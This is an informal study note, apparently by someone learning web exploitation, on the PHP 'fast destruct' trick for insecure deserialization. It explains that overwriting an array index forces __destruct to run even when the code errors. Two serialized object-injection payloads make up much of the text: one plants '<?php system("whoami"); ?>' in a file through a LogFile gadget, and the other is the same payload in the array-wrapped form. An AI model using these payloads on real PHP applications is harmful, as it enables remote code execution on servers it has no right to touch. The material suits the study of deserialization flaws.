Fast destruct:

if there is a destruct method, but the code flow errors out, destruct never gets called.

we can use fast destruct method in this case.

we wrap the payload in an array with arr[0] = pay and arr[0] = random, when we  reassigin the same index, it means that we are gonna destroy a object which was present there before, thus destruct method will be called on that object automatically.

normal pay : O:4:"User":2:{s:8:"username";O:7:"LogFile":2:{s:8:"filename";s:12:"/tmp/test/ok";s:8:"username";s:26:"<?php system("whoami"); ?>";}s:7:"isAdmin";b:1;}

object with two value but it fails the destuct never gets called

pay warpped in array: a:2:{i:0;O:4:"User":2:{s:8:"username";O:7:"LogFile":2:{s:8:"filename";s:12:"/tmp/test/ok";s:8:"username";s:26:"<?php system("whoami"); ?>";}s:7:"isAdmin";b:1;}i:0;i:0;}

now the pay is placed in arr[0] = pay and then replaced wiht 0 again arr[0] = 0

this should be done manually, if you directly reassign it in the code, it will just add the replaced version in pay

thus manually add a:2{i:0;<object payload>i:0;i0;}
